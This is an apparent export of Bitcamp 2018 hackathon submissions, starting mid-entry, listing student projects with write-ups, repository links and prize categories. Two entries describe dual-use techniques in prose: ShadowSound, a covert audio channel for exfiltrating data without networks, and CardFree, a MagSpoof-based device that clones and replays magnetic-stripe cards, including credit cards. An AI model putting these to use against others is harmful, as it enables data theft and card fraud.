Every one finished their own part very well, and we split work very well. We are proud of the artwork, and our communication is very efficient this time. Our idea interesting at least for us, we can play this app whole day.

What we learned

Some advanced java API, how to team coding, Designing User Interface, how to use multi-thread. Most important part is we've learned the process to make an app we want to make, and how to communicate with teammates and make 1+1>2. Also, different people will have different favors and expectations for an app, and then communication is extremely important.

What's next for Pianist

Making animations, improving UI, functions, and remake the algorithm of transform paint into music so it will be produce better music, etc. Also, improve the users experience of using it by implement reading files, also implementing some demos for this app, with some designed drawing which can produce great music. In the future, we can even make drawing and music game based on this.
",https://github.com/lian9997/pianist,"Most Futuristic Hack - Paypal, Best Designed Investor Education Product - Finra, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",No,leoliu,bjiang10,
Media-Documentation For Repository,http://bitcamp2018.devpost.com/submissions/92321-media-documentation-for-repository,"Demo : https://sachinbiradar9.github.io/media-doc/

Inspiration

Most of the times text is not the best way to document the code. New joinee in the organization has to go through the entire the codebase to get on pace with the work. He has to contact various developers if he dosent understand something. It is time consuming for all the developers. It would be very convenient if developers keep an audio/video/image log of the code canges. Media Doc will also be useful to log all the design meetings so that one can look back at it if required.

So, we hereby propose a solution to this problem which involves uploading either the media of the meeting wherein the project or any other documentation related to the project on Github. This, helps the new developer to understand the code base by going through the Github repository of the project along with listening to the audio/video logs of the of the meeting or code explanation if required.

What it does

The web application presents all the commit history of a specified repository in a timeline format. Each commit has  media file tagged along with it which we call ""media documentation"". If there is no media already attached with the commit then we provide a dropfield field where the user can drop/upload a media related to the commit.

How we built it

We utilized MongoDB Stitch to build the backend side of the application because it helped us to focus more on working on the features of the appliction rather than on managing data manipulation code, service integration, and backend infrastructure. We made use of React JS to develop the front end of the Web Application. Github apis were also used in to retrieve the commits from Github repositories.

Challenges we ran into

Presenting the user with the information on the previous commits in a effective way was very essential, and we faced issues while improving the application front end but eventually we were able to provide a simple and smooth interface to the user.

Accomplishments that we're proud of

Got to work on beta version of Mongo DB stitch, the documentation provided was really helpful and it helped us in focusing on the application very well. Also, we were able to provide a simple an minimalist interface using Reactjs which is very easy for the developer to understand.

What we learned

We learned how to utilize MongoDB stitch to develop a web application effectively. 

What's next for MediaDoc

We would like to integrate the application with twilio and send a text to the user whenever the user commits a file to the repository or makes any changes to the repository which would help the user notify that he/she has to submit any kind of media that might be related to the commit
",https://sachinbiradar9.github.io/media-doc/,"Best Use of AWS - Amazon Web Services, Best Use of MongoDB Stitch - MongoDB, Best Hack (be passionate) - Facebook",,sachinbiradar9,,
InfoLane,http://bitcamp2018.devpost.com/submissions/92322-infolane,"Inspiration - After receiving many parking tickets, my friend and I figured that we should create an app where drivers can connect and share the parking specifications of a certain location.  At times, especially during a rush or a panic mode we don't really focus on the signs or where we park.

What it does - It uses the smartphone's GPS location tracker to determine which street you are on and gives information about the parking laws in the area.  This also allows the user to take a pic of the general vicinity of the car.  With this pic the program reads the sign and recognizes certain parking features, and clarifies to the user what the parking situation is.  Such as in DC there are certain parking zones, and this app iterates to the user what these signs mean.  Like 2 hour parking except permit 2, or if parking isn't allowed during a certain day or time.

How we built it - We used Xcode IDE, and wrote it in iOS native language called Swift.  that are connected to the database to save the information that have been submitted through crowd data building.

Challenges we ran into - Using android studios, having a hard time downloading and updating.

Accomplishments that we're proud of - Completing the APP InfoLane.

What we learned - to prepare before hand, and create a product with something you are familiar with.

What's next for InfoLane - Adding bigger database to save more traffic data, such as the laws and traffic regulations.
",https://github.com/wakandaforever1/infoLane,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,javaplanet17,,
Twitter Emotion/Sentiment Analysis,http://bitcamp2018.devpost.com/submissions/92324-twitter-emotion-sentiment-analysis,"Inspiration

We wanted to do something hard, and in my honors they recommended a project similar to this, and I thought it would be fun. We thought it would be a good way to learn about applying our skills for the  first time.

What it does

In theory, it is supposed to analyze a twitter users tweets, and understand the whether it is has positive or negative relationships with the related mentions and hashtags. This could be used to build connections between people and groups of people and better understand why people do what they do. It also can be used to know what relates people and what make them different. Sadly, due to time restrictions we don't have a UI and it has to be run through the command prompt.

How we built it

We used python. We have a parser that parses the tweets from Twitter, using Tweepy. Then we sent to an API called Indico to analyze the sentiment of the tweet.

Challenges we ran into

The parser was especially hard to implement. Tweepy would give us the data in non-string form, and we had trouble converting it to a string. Once we finally got past that we ran into the worst creation known to man-kind, EMOJI'S. These pesky rats wrecked havoc on the code everywhere. We couldn't find a good way to get past all of them so we just brute forced it and used try/catch to ignore them, which is probably a bad idea. Also, for some reason Tweepy will only get a few tweets, rather than all of them. For some reason Tweepy really hates hashtags and rarely gets the tweets with hashtags.

Accomplishments that we're proud of

Getting the project done. For both of us this is a learning experience we both learned a lot about implementing APIs, and parsers.

What we learned

We learned to implement APIs and parsers.

What's next for Twitter Emotion/Sentiment Analysis

I want to clean it up and get emojis to work. I want to get Tweepy to actually work like it is supposed to. Also, get a UI.
",https://github.com/mouctar19/emotionReaderBitCamp2018#bitcamp-2018---twitter-emotionsentiment-analysis,Best Hack (be passionate) - Facebook,,,,
Cyber Bully Identifier,http://bitcamp2018.devpost.com/submissions/92325-cyber-bully-identifier,"Inspiration

When trying to think of a way to make a difference with the UMBC Psychology departments, we discovered this (relatively) simple idea that could really help parents protect their children.

What it does

The app listens for new text messages and sends them to our backend hosted on Google cloud. The server then sends the text into a neural net for processing. All insulting messages are then flagged. 

How we built it

*Backend written in Go, deployed with docker.
*The classifier was written in Python using Keras and Tensorflow using publicly available datasets.
*App written in Ionic Framework. 

Challenges we ran into

*Datasets are hard! A significant portion of the hackathon was spent looking for a working dataset and shaping the dataset to fit our needs.
*Neural networks can do the complete opposite of what you want when the data is bad.
*Learning how to use Ionic in a short amount of time.
*Networking docker containers and debugging multiple services in the cloud is pretty daunting!

Accomplishments that we're proud of

*Working neural net with acceptable error rates for our purposes.
*Robust distributed backend running in the cloud.
*Good proof of concept app.

What we learned

Each of us wanted to tackle different parts of the project, and we all learned a lot about creating systems. Eric learned a lot about networking docker containers and web server dev, Brad learned a lot about Android dev through Ionic, and Nikita learned a lot about neural nets.

What's next for Cyber Bully Identifier

We have a lot of plans to expand the identifier. We found much better (much less callous) datasets online that we would like to train a more suitable network architecture on. As it turns out, training neural networks requires a lot of performance and LOTS of data. Many of the architectures we initially planned on testing were infeasible in the amount of time we had.

We also plan on working on the app much more. Developing the app was tedious but worth it. We want to implement the full functionality (along with some aesthetic tweaks).
",https://github.com/erictg/cyber_bully_detector,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",no,BradOdenath,,
Bitcamp2018,http://bitcamp2018.devpost.com/submissions/92327-bitcamp2018,"Bitcamp2018

PUDUI Project for Bitcamp 2018

PUDUI is a django web application reunite patients, doctors, and the insurance company once again. We want to bring back a time when the doctor and the patient were able to communicate without intermediates in between. We used to be able to call our doctor on their phone and they would answer, not their assistant, and they would talk to you about your symptoms over the phone and give you advice.

Technologies being used

TODO: Implement Nginx, uwsgi and Django together and pfsense


Django python web framework
Sqlite3 database management system
React.js javascript framework
Bootstrap, Html, Css, and jinga templating language for the frontend


The Patient

The patient will want to use this service because it provides them with a convienient method of communicating with their doctor and their insurance company. They will not have to wait on a phone, take time off from work, sit in a waiting room just until the assistant guides them to the exam room, where the doctor will do a few tests and probably say, 'Get some rest, take some cough medicine, drink a lot of water.' Why waste this time when the entire transaction of communication can be started (and potentially ended) online. 


Running production server uwsgi --http :8000 --module PUDUI.wsgi*

",https://github.com/harsh1498/Bitcamp2018,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Accessibility Hack - Microsoft",N/A,,,
Renewable Energy and Policy,http://bitcamp2018.devpost.com/submissions/92328-renewable-energy-and-policy,"Inspiration

At first, we wanted to do a small research project. Collect data, analyze it and present it. Our main goal was to look at renewable energy policies.

What it does

We decided to create an applet with information to teach people about renewable energy policies and law around the United States. By typing a US zip code. It can give the number of policies and incentives in that area. This tool will also provide the links redirecting you to a website with all the information about a particular incentive or policy.

How we built it

We used tableau to great the graphs. We used R, Jupyter Python to collect, scrape, and organize the data.

Challenges we ran into

Finding the right data took us a lot of time. It also took us a lot of time to get the right type of data for the applet to work properly.

Accomplishments that we're proud of

Being able to create an applet from a potential research paper.

What we learned

Data, collecting data, understanding normalization in data, etc.

What's next for Renewable Energy and Policy

Being able to predict more reasons why some states are less interested into clean energy.
",http://www.renewableenergyandpolicy.com/,Most Unique Hack - 1517 Fund,No,sarahfjackson,AndrewCho58,
StoryBoard,http://bitcamp2018.devpost.com/submissions/92332-storyboard,"Inspiration

MLH stopped providing Photo-booths at hackathons :(

What it does

Takes dope photos at dope events.

How we built it

Native IOS app, Website in react, Twilio text messages, Spark Post emails, node backends services, MongoDB

Challenges we ran into

..

Accomplishments that we're proud of

..

What we learned

it was lit

What's next for StoryBoard

Gif, custom events ..
",,"Best use of SparkPost API - SparkPost, Best Use of AWS - Amazon Web Services, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",N/A,darkfader,,
Tilted,http://bitcamp2018.devpost.com/submissions/92334-tilted,"Inspiration

Being ""tilted"" is a (formerly) nonspecific adjective attributed to League of Legends players that have a 
""lose-more"" attitude; you lose once, you get upset, you're more likely to lose again. We wanted to know how accurate this notion really is, and whether it can be measured for the average player. 

What it does

Calculates the relative ""tilt"" of a user over the span of a specified number of matches. This data is represented as a graph, as well as an overall ""current tilt.""

How we built it

Front-end was build with MD bootstrap framework, with standard HTML/JS/CSS and a proxy server set up with Node.js and AWS. 

Challenges we ran into

Riot's API was difficult to work with, and we ended up having to create a proxy server with AWS that would allow us to communicate with the API. Additionally, there was the difficulty of coming up with an objective measure of what was likely to effect someone's mood in-game. 

Accomplishments that we're proud of

Getting by our CORS error and creating our tilt-calculating algorithms.

What we learned

How to set up a proxy server to communicate with an API, as well as performing JSON requests.

What's next for Tilted

Increased amount of data visualization using chartlist.js and make this available to the general majority of League of Legends players. We would also like to fine-tune the algorithm. 
",https://github.com/TomerKrayzman/Tiltulator,"Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",No,saeberg,,
Watch as Words,http://bitcamp2018.devpost.com/submissions/92335-watch-as-words,"Inspiration

While closed captioning (auto-generated or not) is an available option on YouTube, it is not accessible for every video (ex: older videos). Some people prefer to have captioning on, whether they are learning a language, are hard-hearing, or just prefer to read subtitles along with the video. Others may be situated in loud environments, or maybe they left their earbuds at home; either way, they want to know the contents of the video they want to watch. That's where the video transcription idea came in -- so you can watch your video through words.

What it does

This app takes a video file (.mp4) as an input and generates a text file of the transcribed video.

How we built it

Watch as Words was built using C#, the Microsoft Bing Speech API, and Visual Studio.

Challenges we ran into

We struggled a lot with implementing the API and we had a lot of issues with the GUI. 

Accomplishments that we're proud of

It works!!!!

What we learned

Neither of us knew C# nor did we have experience with implementing APIs prior to this hackathon; after thorough research, it is safe to say that, as a group, we definitely have a lot to take away.

What's next for Watch as Words

The next steps would be to move it to the web, and possibly add in a feature to take YouTube links as an input. Some other great add-ons would be to have the option to send the transcript to an e-mail address.
",https://github.com/WinstonMoh/Watch-as-Words,"Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,,,
middleOutSubscriptions,http://bitcamp2018.devpost.com/submissions/92337-middleoutsubscriptions,"middleOutSubscriptions


",https://github.com/kakorrhaphio/middleOutSubscriptions,"Best use of SparkPost API - SparkPost, Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Most Unique Hack - 1517 Fund",,,,
https://medium.com/@pixelyunicorn/title-e9c5bc245104,http://bitcamp2018.devpost.com/submissions/92338-https-medium-com-pixelyunicorn-title-e9c5bc245104,"https://medium.com/@pixelyunicorn/title-e9c5bc245104
",,,,,,
ShadowSound,http://bitcamp2018.devpost.com/submissions/92339-shadowsound,"Inspiration

The idea of building a secret network between phones using hypersonic frequencies to avoid human detection.

What it does

ShadowSound, the program, provides a disguised channel using any audible sound by subtly modifying any audio played through any system's speakers. A bitstream can be placed on these modifications, allowing other nearby speaker systems to receive transmissions. This can be used to exfiltrate data without using any networks. The audio that is broadcasted is not considered suspicious, as it hijacks user played audio in a way in which the modification remains nearly unnoticeable. 

How we built it

The clients are built in Python. The fundamental mechanism that we used removed a insignificant section of the audio being sent using a bandpass filter. The human ear doesn't notice the modified gap while a nearby mic with ShadowSound can pick up and decode the the message using the missing sound. The presence of this gap is  oscillated to encode bits. The baud rate is relatively low allowing the encoding of characters using the five bit Baudot encoding rather than the eight bit ASCII. This made the data transmission 37.5% more efficient. The transmitting side sits in the audio driver position, intercepts audio sent to the speakers, and redirects it into ShadowSound. ShadowSound then modifies the audio,encoding the next bit of any given message to finally be outputted through the speakers. On the receiving end, the program takes the Fast Fourier Transform of a chunk of the audio and checks for whether a band around, 500hz, has been removed. 

Challenges we ran into

There were two major challenges we ran into. The first was finding a way to modify audio in a way which is not obvious to listeners. The second was dealing with the poor frequency responses of consumer laptop microphones and speakers.

Accomplishments that we're proud of

The team is most proud of bringing the idea of ShadowSound to a working reality within a 36 hour hackathon. 

What we learned

Three fourths of the team has never worked audio or audio processing. Together with the knowledge of the fourth teammate the team was able to overcome the challenges faced while creating ShadowSound. Initially the team approached the project attacking the same problem at the same time. About 8 hours into the project we realized that we would not finish if we worked on the same part of the project. The work was then divided and conquered.  

What's next for ShadowSound

The team plans to make the transmissions much more discrete. The team would also like to optimize the rate at which bits can be transmitted. As the transmission of data through an audible, publicly projected, source unnoticeably is the purpose of ShadowSound, making it harder to find, and faster is its main goals. 
",https://github.com/naterenegar/ShadowSound,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund",No,,,
Hand-in-Hand,http://bitcamp2018.devpost.com/submissions/92348-hand-in-hand,"Crowd Sourcing Humanitarian Relief

Hand in Hand is a platform that connects individuals directly to relief organizations with maximum transparency

Problem

With the decrease in government aid, more and more people rely on donations after a natural disaster strikes. However, people often donate items that are not needed, which creates more logisitcal challenges[1] and delay in aid[2].

Our platform solves this problem with transparency by combining registries with relief organizations.  Anyone who visits the site can pick a specific site and see the items most needed by the victims.  They can choose to contribute online through Amazon Smiles or monetary donation; or they can donate items locally to their nearest relief organization site. 

User Stories

The following required functionality is completed:


[X] User can view current disasters as pins on a globe
[X] User can select a pin/location to contribute
[X] User can select item or monetary donation


The following optional features are implemented:


[ ] Individual Profiles for Donors and Relief Organizations
[ ] Live tracking of relief funds/items to actual site of disaster


Notes

Challenges encountered while building the app.


filtering data to include relevant natural disasters around the globe
difficult to query the natural disaster data after appending to the map
got suspended on the arcgis website without warning and had to remake our webmap from scratch
difficult to find disaster data with latitude/longitudes
difficult to find disaster data that included impact radius or number of people affected


API, Libraries, etc.


ArcGIS https://developers.arcgis.com/
FEMA Disaster Declarations Summaries


Resources


[1] http://insidedisaster.com/haiti/response/relief-challenges
[2] https://www.cbsnews.com/news/best-intentions-when-disaster-relief-brings-anything-but-relief/

",https://github.com/hmkiesel/Hand-in-Hand,"Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri",no,WillyWonkaCocoa,,
Flock,http://bitcamp2018.devpost.com/submissions/92352-flock,"Inspiration

Health Insurance in the United States is dominated by four companies that provide 84% of all coverage. These companies hire extensively and seek to grow their business(like almost all businesses). The cost of this desire is that the consumers pay much above what they should be paying for health insurance. Public misconceptions about treatment costs, health insurance companies, and centralized authority, enable these companies to charge exorbitant amounts of money for coverage.

What it does

Flock replaces the insurance broker. Instead of paying premiums to an insurance company and hope that your claims go unfought, you pay into a clustered pool that is used exclusively for medical bills. Using a reward system for correct claim assessment, we have built in a delegate system that audits claims and releases funds when needed. Flock is not in control of your funds at any point, instead choosing to delegate power to decentralized communities who in turn determine risk, premiums, deductibles, and other aspects associated with traditional insurance. Without a large company as middleman, the amount we save on wages and fees are directly passed to users. We aren't here to create a monopoly(not to mention we are unable to due to the nature of our network), we're here to provide a service and utility.

How we built it

We built the backend with Firebase and developed a set of smart contracts on the Ethereum blockchain to establish a system of governance amidst Flocks as well as guarantee the integrity of a functioning, decentralized insurance network. ACES nodes were setup to communicate with the Ark Network. However they only worked partially on the testnet as we could not setup the ACES nodes on the Ark Mainnet. The front end was made in React after being mocked up in Photoshop.

Challenges we ran into

Getting acquainted with Ark was definitely a big challenge. Their sidechain setup and azure script were ultra-accessible, but beyond that, use of wrappers other than Arky required a ton of reading and understanding of the source code to get very far. However we really wanted to utilize Ark's low block clear time,which was super appealing to Ethereum's 15s clear times, as were trying to build something on great scale. Ultimately we did manage to come up with a workaround using ACES and Smart Contracts on Ethereum.

Accomplishments that we're proud of

We managed to get an Ark sidechain running pretty quickly. We worked very hard and well together which was super wholesome, and we became heavily familiar with a lot of facets of Ark. We successfully deployed smart contracts that interacted through the web3 api to connect our pretty frontend with our powerhouse backend. Also our logo looks neat!

What we learned

We learned that pushing a focus on user acquisition rather than emergent technologies was more beneficial to appealing to would-be user/customers. It's great that decentralization brings about a whole new world of possibilities, but until we're in that new world, we need to work hard as developers to develop products that people want that leverage the blockchain effectively. It's not enough to say this technology is the future, you have to prove to the end-user that it truly is.

What's next for Flock

Flock's smart contracts will most likely be revised to support more customization in Flocks/Clusters. Afterwards we'll do a rewrite on our frontend before seeking some form of venture capital to hold us over while we build it out. We still want to use Ark's systems, so getting ACES nodes setup is also a priority.
",https://github.com/matt33n/Flock,"Decentralise Everything: Blockchain challenge - Ark, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",No,Matt33n,cstacho,
Konnex,http://bitcamp2018.devpost.com/submissions/92357-konnex,"Inspiration

Career fairs, Difficult to obtain a job with current system.

What it does

Helps you connect with others using nfc chip technology.

How I built it

Android studio
Google Firebase

Challenges I ran into

Large data
Dependencies 
Repositories

Accomplishments that I'm proud of

Getting it to work!

What I learned

Android studio 
Google Firebase
Working in a real development team

What's next for Konnex

Seed funding! 
",https://www.konnex.co,Best Designed Investor Education Product - Finra,No,Darkhelm,rarguet1,
D&D Town Tool,http://bitcamp2018.devpost.com/submissions/92359-d-d-town-tool,"Inspiration

We like playing D&D with our friends, but if the party disagrees on something, it often results in one half of us doing something while the other does nothing. This tool allows the DM in charge to multitask and manage multiple different sub-groups at once.

What it does

Simulates a town with Non-Playable Characters(NPCs) and player characters in a primarily text based enviroment.

How we built it

Working in Eclipse, sharing the project through Github, spliiting it into parts and tackling each part individually.

Challenges we ran into

Coming up with the idea, time constraints.

Accomplishments that we're proud of

Getting as far as we did, creating a working server-host relationship.

What we learned

How to manage our time/prepare better.

What's next for D&D Town Tool

More features based on practical tests with the program.
",https://github.com/BitCamp2018-zmjteam/2018-project,,,Brunswick-Khorasan,,
Smile,http://bitcamp2018.devpost.com/submissions/92360-smile,"Smile App

Inspiration

When going through high school, students tend to feel shy and intimidated to present in front of their peers. Some of us have also had this experience and obviously, this was mostly because we never had practice and constructive criticism that helps us improve gradually. We hope, by making this app, many students and adults will get more practice and note where in their speech they can improve, giving users confidence in knowing how to present their speech.

What it does

The Smile app helps people to get ready for presentations and interview with access to an iPhone and our app. It allows the user to practice a speech in front of his/her phone camera. Then, the app uses a machine learning model to see instances where the user is happy, angry, neutral or sad: the general emotions that a human goes through. Generally, people tend to be on the happy or neutral emotional state when presenting a good speech or when communicating effectively. 

How we built it

We designed the graphical user interface using Figma.com.
Then we separately worked on implementing the project on both Android and iOS platforms using Machine Learning data models for iOS and Google Cloud Vision API for Android.
By distributing tasks evenly 

Challenges we ran into

Low internet speed
Google cloud vision wasn�۪t working the way we wanted. //Android version was tough and was not completed.
GitHub
Core Machine Learning modules were difficult to get working
Combining speech recognition messed up the code
Gives a few false positives

Accomplishments that we're proud of

We were persistently working on the project no matter what problem we faced.
We completed our iOS app and still looked for extra ways to improve the information given to the user.

What we learned

Using core ML Framework 
Boosting the accuracy of a data model
Creating a speech recognition method
Using Google Cloud Vision API to do sentiment analysis on a picture of a person

What's next for Smile

The next step for our application is to use common interview questions in order to make the interviewee more comfortable at the real interview. For instance, we can use the ���Cracking the coding interview�۝ questions to make CS students more comfortable and ready for the interview questions. Furthermore, this app can help students and employees ready for presentations by giving tips according to their results that did estimate by Smile app. We are going to use heartbeat data, gesture data models, speech emotion recognition, text recognition and face recognition data to analyze the interviewee performance.
",https://github.com/mmohades/Smile,"Most Futuristic Hack - Paypal, Best Designed Investor Education Product - Finra, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,yonaadug,,
CardFree,http://bitcamp2018.devpost.com/submissions/92362-cardfree,"Inspiration

What if there was some way to simplify the process of getting into our dorms? Wouldn't it be easier if you could swipe into your building with something attached to your keys? What if you could replace all magstripe style cards in your wallet with a single keyfob? Our CardFree project was inspired by our interest in Samsung's MST technology and our desire to build something that might improve the convenience of an action taken by students multiple times a day.

What it does

CardFree replicates the magnetic signature of a magnetic stripe card. It works with any type of magstripe card, such as a student ID or a credit card.

Using a magnetic card reader, we obtain the raw binary data from the user's card and program it to the key-chain device (ATTiny85), so that it can replay the binary signals through a temporarily generated electromagnetic field. The pulse of data within this field ""tricks"" any magnetic card reader, be it a point of sales or a door lock, into thinking a card was swiped through it. 

How we built it

MagWorks Software - Our magnetic stripe reader is an HID USB device. It doesn't have a serial interface and therefore requires direct control through binary data transfers across the USB protocol. As little documentation exists for such devices, we researched the types of data transfers for USB and learned how to construct these binary instructions bit by bit. We used this knowledge to write a Python-based CLI driver (MagWorks) for our magnetic stripe reader, customized for everything we need. It can read, write, clone, and erase any magnetic stripe card.

Circuitry - Based on SamyK's MagSpoof design, we created a circuit that produces an electromagnetic field that projects magnetic stripe data wirelessly into any magnetic card reader.

ATTiny85 - Microcontroller controlling the entire device, stores relevant card data and replays it.

L293D Motor Driver - Motor driver to provide necessary current from LiPo battery for a sufficient magnetic field to 
                                      generated by the magnetic coils.

Magnetic Coils - ~50 coils of 24 gauge magnetic wire with ~ 3-inch circumference 

LiPo - 100 mAh 3.7 V battery for inducing the magnetic field and powering ATTiny85.

Case - To create more of a ""production"" model of our circuit, we 3D-printed an enclosure for our most successful prototype device. This enclosure isn't perfect, but acts as a perfect model for what the key-chain could look like.

Challenges we ran into

We tried to miniaturize our circuit further but it had a short that we were unable to locate. We had to use our V2 prototype for the final product, despite it being larger than we initially desired for the final product.

We struggled to accurately reproduce all three tracks of a magstripe card with our circuit. We had to spend a lot of time running through small, tedius changes to the ATTiny85's programming in order to produce a consistent, correct magnetic field with the correct card data.

It was very difficult to decode the data on our student IDs. Our card reader does not read and return the raw binary digits directly off of the magnetic stripe. It actually has it's own specs for reading raw card data, and we had to do a lot of binary conversions to figure out exactly how to translate the raw data we received into something we could use.

Accomplishments that we're proud of


Writing a Python-based driver for a USB device that would otherwise be unresponsive.
Successfully decoding the data off of the UMD student ID cards.
Successfully simulating magnetic strip cards with a keychain-sized device.


What we learned


How to write drivers for and directly control USB devices.
How financial cards follow a standard ISO encoding format, and how to parse it.
How to decode raw data encoded on any non-standard magnetic stripe card.
How to effectively organize components on a circuit with limited space.
How magnetic stripe data can be produced via an electromagnetic field to ""trick"" card readers into thinking a card was swiped.


What's next for CardFree


Make it much smaller. 
Use a custom printed PCB instead of complex soldering.
Add functionality for multiple cards on a single CardFree.
Add a larger battery.
Improve reliability and range.
Better activation button.

",https://github.com/wesley27/cardfree,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Digital Forensic Hack - Cipher Tech Solutions, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,wesleyw978,,
Limacon,http://bitcamp2018.devpost.com/submissions/92365-limacon,"Inspiration

Domestic violence is a preventable public health problem that does not discriminate and can happen to anyone regardless of age, race, gender, education, wealth, or sexuality. Often, barriers to healthcare or lack of a support system prevents victims from connecting to the resources that already exist. Other times, the resources are not presented or advertised in a way that is accessible to the people who need it the most.

'Limacon' is similar to the name of one of the women who inspired me to make this website, who is a survivor of domestic violence, was able to leave her relationship, and became a social health worker, advocate of survivors, and educator to raise awareness about the public health issue of domestic violence. I want this website to contribute to the increase in support for and conversation around how we can address domestic violence symptoms and root causes. 

What it does

This website is an accessible place that empowers people in abusive relationships who are looking for resources to make choices about what steps they want to take, whether it's talking to someone on the phone, finding a local resource, talking to someone trained to help minors, or learning more about what their legal rights are. Limacon connects people to organizations and groups that are available to help them, through a simple, approachable design. The website also aims to have an education section for people who are not victims but want to learn more about the reality of domestic violence through data visualization. 

How I built it


Research: what makes a website accessible? What features do existing domestic abuse help websites have that can be improved upon? What existing resources and databases are there for survivors? 
Brainstorming and organization: what features and categories should the website have? How should the information be grouped together for maximum readability? 
Learning the technical: becoming familiar with the syntax and structure of HTML, CSS, and JS 
Execution: translating design ideas into code, linking outside resources, putting together design, testing, debugging


Challenges I ran into


Bringing together many factors that make a website more accessible while thinking about good design
I did not have much background in web design 
Learning how HTML, CSS, and JS work together to create a functioning website
Trying to create the best structure and format for the information that allowed for  optimal interactions with text-to-speech software that vision-impaired users would read the website through 


Accomplishments that I'm proud of


The organization of the website is thoughtful 


What I learned


How HTML, CSS, and JS work and interact with each other 
Syntax, structure, and conventions of HTML, CSS, JS 
Ways to approach accessibility of websites and types of disabilities to consider 
It is useless to style an HTML paragraph as if it were a heading, because it prevents text-to-speech softwares from describing the hierarchy of the website 
""Accessibility is not a barrier to innovation"" 


What's next for Limacon


Developing the 'Learning' section of the website with data visualization to present the scope of the problem 
Getting a domain name to host the website 

",,"Best Philanthropic Hack - Bloomberg, Best Accessibility Hack - Microsoft",,,,
Acred,http://bitcamp2018.devpost.com/submissions/92366-acred,"Inspiration

Read about a farmer who received numerous microloans, still turned away by banks. He owned land and made money from his harvest. He was financially excluded, trapped her in a debt repayment cycle

What it does

We help facilitate borrowers and investors get microloans. We store all transactions in a blockchain so there is a permanent record to hopefully build:

Unforgettable Credit Rating ��� user unable to erase credit history
Certification System ��� other users testify if goal was achieved or not
Fraud ��� disincentivised as will be apparent across network

How we built it

Ark, Flask, Azure

Challenges we ran into

Blockchain learning curve, web issues

Accomplishments that we're proud of

We learned how to create our own blockchain using Ark and create a fairly decent platform

What we learned

Blockchain and why microloans are important

What's next for Acred

Possibilities are endless
",,"Decentralise Everything: Blockchain challenge - Ark, Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook",,,,
OpticTrace,http://bitcamp2018.devpost.com/submissions/92368-optictrace,"Inspiration

The inspiration for this project came from our common interest in computer vision and in robotics. When we came together for Bitcamp we knew that we wanted to work in one or both of those objectives so we began sharing ideas and I pitched the idea to work with openCV since it has caught my attention with it's current popularity. Since computer vision is a very fresh and growing market we agreed to work using this idea and collaborated on creating an infrastructure that is built upon using openCV to give the user the ability to track any object as long as it is equipped with the specific tracking marker provided by us.

What it does

OpticTrace is a multi-purpose color tracking software that uses an openCV library in python in combination with Arduino powered servos in order to provide live tracking of objects in motion. Our current application of this software gives the user the ability to track any object as long as it is equipped with the specific tracking marker provided by us. This can be applied to different situation like having a football launcher that tracks your position in the distance to throw you the ball, or to possible mount a paintball/airsoft turret that can be used by both teams to defend objectives in the game and can be disabled by shooting a color switched located near the turret.

How we built it

We began with finding the proper way to approach openCV and how it can be applied to our original project idea. This idea was to have servo powered platforms that will rotate a camera to allow it to live track a moving object which was original intended to be a person. Later on we kept with the idea of using a servo powered platform but switch our detection to detect color which was more feasible since this is our first time working with CV.

Challenges we ran into

The initial challenge was to find the proper openCV program that can be downloaded and used to communicate with an servo motors through an Arduino. This took as a very long time since we could not find the proper library that would allow us to not only give commands to the servos to rotate an object to our desired position, but perform this these tasks in real-time while the object is still in the line of sight of our camera to be able to locate and track it.

Accomplishments that we're proud of

The accomplishment that we are most proud of, is being able to find a openCV library that's compatible for communicating with an Arduino in real-time. Most of us have had experience working with Arduino but no one has worked with being able to send live signals to the Arduino. Another accomplishment for us, was being able to build a functioning flexible base for our camera so it can freely rotate on both the x and y axis in order to provide more accurate object tracking.

What we learned

All of us learned a lot about how to send live signals to an Arduino (serially) and be able to communicate with it using python. We also learned the python library for openCV and its many application in object detection and tracking which can be used for future projects.

What's next for OpticTrace

Although the important framework behind our project is complete, our project has a variety of specific applications. In order to be able to perform the tasks for these application, there has to be other components that will have to be added on to our base. These components will perform using the same structure as the already build framework, but will perform specific tasks like launch a football or a projectile at a certain target for a certain amount of time, or a pressured sensitive button that will disable the object tracking for a certain duration of time.
",https://github.com/RoboRiot/RGBview,"Best Digital Forensic Hack - Cipher Tech Solutions, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,jyang254,Rudedaisy,
Un/Biased,http://bitcamp2018.devpost.com/submissions/92369-un-biased,"Bitcamp

Bitcamp 2018 Submission
Used the Google Cloud Natural Language API to do Sentimental and Categorical Analysis on a Person's name and his text given the name (Scrapes information from Wikipedia)
Through this analysis, possible bias in their writings is studied. 

Challenges:
Couldn't connect the python files to an optimal ui and host it. 
Not every person has a Wikipedia page to use to perform the analysis on. 
Google Api is tricky for a beginner to work on. 
Some texts have issues being analyzed. 

Future Plans:
Using Google search API instead of the Wikipedia api for a broader range of authors/writers to analyze
A dope-ass UI that hosts the files I made. 
A better relation to find bias. 

